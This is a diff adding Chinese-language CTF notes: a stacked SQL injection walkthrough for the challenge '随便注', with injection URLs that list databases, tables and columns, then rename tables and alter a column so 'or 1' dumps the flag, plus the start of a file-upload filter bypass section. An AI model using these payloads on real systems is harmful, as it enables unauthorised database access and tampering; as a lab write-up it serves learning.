@@ -1,3 +1,37 @@
+#### sql注入
+##### 1、堆叠注入
+```
+例题: [随便注]
+/?inject=1';show databases; --+
+
+/?inject=1';show tables; --+
+
+/*获得两个表名
+1919810931114514
+words
+*/
+
+/?inject=1';show columns from `words`; --+
+
+/*
+words里面：id data
+1919810931114514里面：flag
+*/
+
+推断查询语句(inject=1的输出)：
+select id,data from `words` where id='$id'
+
+// 修改表名
+rename tables `words` to `haha`;
+rename tables `1919810931114514` to `words`;
+
+// 修改字段类型及名称;在change关键字之后，紧跟着的是你要修改的字段名，然后指定新字段名及类型
+alter table `words` change `flag` `id` varchar(100);
+
+
+/?inject=1' or 1 --+
+```
+
 #### 文件上传
 ##### 1、上传文件，发现后台检测了文件内容包含<?，则可以通过一下方法绕过
 ```javascript
